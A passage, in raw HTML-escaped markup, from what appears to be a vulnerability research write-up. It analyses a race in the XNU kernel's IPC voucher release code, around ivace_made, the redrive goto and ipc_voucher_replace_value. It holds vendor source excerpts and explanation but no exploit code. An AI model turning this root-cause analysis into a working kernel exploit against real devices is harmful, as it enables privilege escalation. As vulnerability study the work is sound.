class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* callout to manager&amp;#39;s release_value */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* recalculate entry address as table may have changed */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* new made values raced with this return. &amp;nbsp;If the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* manager OK&amp;#39;ed the prior release, we have to start&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the made numbering over again (pretend the race&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* didn&amp;#39;t happen). If the entry has zero refs again,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* re-drive the release.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;goto&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_releasing &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;else&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;They grab the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock again and recalculate a pointer to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;(because the table could have been reallocated while the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;lock was dropped, and only the index into the table would be valid, not a pointer.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Then things get really weird; if &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t equal to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;made&lt;/span&gt;&lt;span&gt;&amp;nbsp;but &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_release_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;did return &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;KERN_SUCCESS&lt;/span&gt;&lt;span&gt;, then they subtract the old value of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the current value of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;, and if &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, they use a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;goto&lt;/span&gt;&lt;span&gt;&amp;nbsp;statement to try to free the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;again?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;If that makes complete sense to you at first glance then give yourself a gold star! Because to me at first that logic was completely impenetrable. We will get to the bottom of it though.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;We need to ask the question: under what circumstances will &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field ever be different? To answer this we need to look back at &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher_replace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;where the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;are actually allocated:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.6678b43a7a459c004d346e8b4b835a591c986cfd\"&gt;&lt;/a&gt;&lt;a id=\"t.48\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_get_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_flag&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_value_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;...&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7 BGLtzooHlW-c23\"&gt;WINDOW&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;We already looked at this code; if you can&amp;#39;t remember what &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;are meant to do, I&amp;#39;d suggest going back and looking at those sections again.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Firstly, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher_replace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;itself isn&amp;#39;t holding any locks. It does however hold a few references (e.g., on the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span 